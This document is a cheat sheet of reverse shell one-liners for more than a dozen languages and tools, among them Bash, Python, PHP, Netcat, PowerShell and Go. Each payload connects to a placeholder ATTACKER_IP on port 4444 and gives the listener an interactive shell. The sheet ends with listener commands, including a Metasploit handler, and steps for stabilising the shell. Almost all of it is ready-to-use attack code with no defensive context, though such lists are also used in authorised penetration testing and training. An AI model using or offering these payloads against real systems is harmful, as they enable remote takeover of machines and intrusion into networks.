# Reverse Shell Payloads

## Bash
```bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
0<&196;exec 196<>/dev/tcp/ATTACKER_IP/4444; sh <&196 >&196 2>&196
```

## Python
```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

## PHP
```bash
php -r '$sock=fsockopen("ATTACKER_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("ATTACKER_IP",4444);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("ATTACKER_IP",4444);system("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("ATTACKER_IP",4444);passthru("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("ATTACKER_IP",4444);popen("/bin/sh -i <&3 >&3 2>&3","r");'
```

## Perl
```bash
perl -e 'use Socket;$i="ATTACKER_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ATTACKER_IP:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

## Ruby
```bash
ruby -rsocket -e'f=TCPSocket.open("ATTACKER_IP",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("ATTACKER_IP","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

## Netcat
```bash
nc -e /bin/sh ATTACKER_IP 4444
nc -e /bin/bash ATTACKER_IP 4444
nc -c /bin/sh ATTACKER_IP 4444
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f
```

## Socat
```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:4444
```

## PowerShell
```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

## Java
```bash
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKER_IP/4444;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

## Node.js
```bash
require('child_process').exec('bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"')
```

## Golang
```go
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","ATTACKER_IP:4444");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/shell.go && go run /tmp/shell.go
```

## Lua
```bash
lua -e "require('socket');require('os');t=socket.tcp();t:connect('ATTACKER_IP','4444');os.execute('/bin/sh -i <&3 >&3 2>&3');"
```

## Listener Setup
```bash
# Netcat
nc -lvnp 4444
# Socat
socat file:`tty`,raw,echo=0 tcp-listen:4444
# Metasploit
msfconsole -q -x "use exploit/multi/handler; set payload generic/shell_reverse_tcp; set LHOST ATTACKER_IP; set LPORT 4444; run"
```

## Upgrade Shell
```bash
# Spawn PTY
python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/sh")'
# Background
Ctrl+Z
# Stabilize
stty raw -echo; fg
export TERM=xterm
```
